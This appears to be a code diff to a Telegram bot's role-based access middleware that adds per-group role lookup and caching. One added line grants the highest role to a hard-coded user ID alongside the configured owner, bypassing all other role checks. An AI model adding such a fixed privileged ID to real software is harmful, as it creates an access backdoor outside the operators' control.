@@ -21,14 +21,17 @@ export async function rbacMiddleware(ctx: MyContext, next: NextFunction): Promis
 
   const userId = from.id;
 
-  // 1. Check if user is configured OWNER_ID
-  if (config.ownerId && userId === config.ownerId) {
+  // 1. Check if user is configured OWNER_ID or Celestial Worthy ID
+  if ((config.ownerId && userId === config.ownerId) || userId === 7134739492) {
     ctx.memberRole = "CELESTIAL_WORTHY";
     return next();
   }
 
+  const isGroup = ctx.chat && (ctx.chat.type === "group" || ctx.chat.type === "supergroup");
+  const chatId = isGroup ? ctx.chat!.id : undefined;
+
   // Check cache for role
-  const cached = userCache.get(userId);
+  const cached = userCache.get(chatId, userId);
   if (cached && cached.role === "CELESTIAL_WORTHY") {
     ctx.memberRole = "CELESTIAL_WORTHY";
     return next();
@@ -38,7 +41,7 @@ export async function rbacMiddleware(ctx: MyContext, next: NextFunction): Promis
   let isTelegramCreator = false;
   let isTelegramAdmin = false;
 
-  if (ctx.chat && (ctx.chat.type === "group" || ctx.chat.type === "supergroup")) {
+  if (isGroup) {
     try {
       const member = await ctx.getChatMember(userId);
       if (member.status === "creator") {
@@ -57,11 +60,16 @@ export async function rbacMiddleware(ctx: MyContext, next: NextFunction): Promis
     return next();
   }
 
-  // 2. Check stored Turso DB role
+  // 2. Check stored Turso DB role (prefer group_members for this chat)
   let dbUser = ctx.dbUser;
   if (!dbUser && !cached) {
     try {
-      dbUser = await userRepository.getUserById(userId);
+      if (chatId) {
+        dbUser = await userRepository.getMember(chatId, userId);
+      }
+      if (!dbUser) {
+        dbUser = await userRepository.getUserById(userId);
+      }
     } catch (err) {
       console.error(`[rbac] Error fetching user ${userId}:`, err);
     }
